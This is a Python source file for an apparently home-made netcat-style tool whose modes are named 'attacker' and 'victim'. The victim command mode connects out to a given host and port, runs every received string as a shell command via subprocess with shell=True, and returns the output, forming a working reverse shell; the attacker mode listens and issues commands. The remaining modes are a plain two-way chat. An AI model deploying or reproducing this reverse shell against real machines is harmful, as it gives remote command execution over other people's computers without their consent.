import getopt
import sys
import socket
from threading import Thread
import os
import subprocess

HOST = "127.0.0.1"
PORT = 0
LISTEN = False
COMMAND = False

def main():
    global PORT, HOST, LISTEN, COMMAND
    try:
        args, _ = getopt.getopt(sys.argv[1:], "p:t:lc", ["port=", "target=", "listen", "command"])
    except:
        print("Invalid arguments")

    # print(args)

    # Print Help
    if args == []:
        openFile = open("help.txt", "r")
        helpText = openFile.read()
        print(helpText)
        openFile.close()
        return
    else:
        for key, value in args:
            if key == "-p":
                PORT = int(value)
            elif key == "-t":
                HOST = value
            elif  key == "-l":
                LISTEN = True
            elif key == "-c":
                COMMAND = True

    # Validate port
    if PORT != 0:
        if PORT <= 10 or PORT >= 4096 or isinstance(PORT, int) == False:
            print("Invalid Port")
            return
    
    # Validate IP
    if HOST != "":
        try:
            socket.inet_aton(HOST)
        except socket.error:
            print("Invalid IP") 
            return

    # Switch mode
    if LISTEN == True and COMMAND == True:
        attacker_command()
    elif LISTEN == True and COMMAND == False: 
        attacker_message()
    elif LISTEN == False and COMMAND == True: 
        victim_command()
    elif LISTEN == False and COMMAND == False: 
        victim_message()

def attacker_command():
    # Connection for attacker
    sock = socket.socket()
    sock.bind((HOST, PORT))
    sock.listen(5)
    print("[*] Connecting...")
 
    # Connection for victim
    con, addr = sock.accept()
    print(f"[*] Connected to {addr[0]}:{addr[1]}") 

    # send command
    send_command_thread = Thread(target=send_command, args = (con,))

    # receive response
    receive_response_thread = Thread(target=receive_response, args=(con,))

    receive_response_thread.start() 
    send_command_thread.start()

    receive_response_thread.join() 
    send_command_thread.join()

    # Close connection
    sock.close()
    con.close()

def send_command(con):
    while True:
        try:
            command = input()
            con.sendall(command.encode())

            if command == "exit":
                print("[*] Disconnected")
                sock.close()
                con.close()
                break
        except:
            break

def receive_response(con):
    while True:
        try:
            response = con.recv(4096).decode() 
        except:
            break

        if response == "":
            break

        print(response.strip())

def victim_command():
    con = socket.socket()
    con.connect((HOST, PORT))
    print("[*] Connected to host")

    while True:
        #receive command
        try:
            command = con.recv(4096).decode()
            
            if command == "exit":
                print("[*] Disconnected")
                sock.close()
                con.close()
                break
        except:
            break

        if command[:2] == "cd":
            try:
                os.chdir(command[3:])
            except:
                con.send("Invalid path".encode())

            continue
    
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()

        if output == b'':
            con.send(error)
        else:
            con.send(output)

    con.close()

def attacker_message():
    global HOST, PORT

    print("[*] Connecting...")
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((HOST, PORT))

        sock.listen()

        con, addr = sock.accept()

        print("[*] Connected to {}".format(addr))

        while True:
            #send message
            message = input(">> ")
            con.sendall(message.encode())
            if message == "exit":
                print("[*] Disconnected")
                break

            #receive message
            data = con.recv(2048).decode()
            if not data or data == "exit":
                print("[*] Disconnected")
                break
            print("Message from V: " + data)      

def victim_message():
    global HOST, PORT

    with socket.socket() as sock:
        sock.connect((HOST, PORT))
        print("[*] Connected to host")
       
        while True:
            #receive message
            data = sock.recv(2048).decode()
            if not data or data == "exit":
                print("[*] Disconnected")
                break
            print("Message from A: " + data)

            #send message
            message = input(">> ")
            sock.sendall(message.encode())
            if message == "exit":
                print("[*] Disconnected")
                break

if __name__ == "__main__":
    main()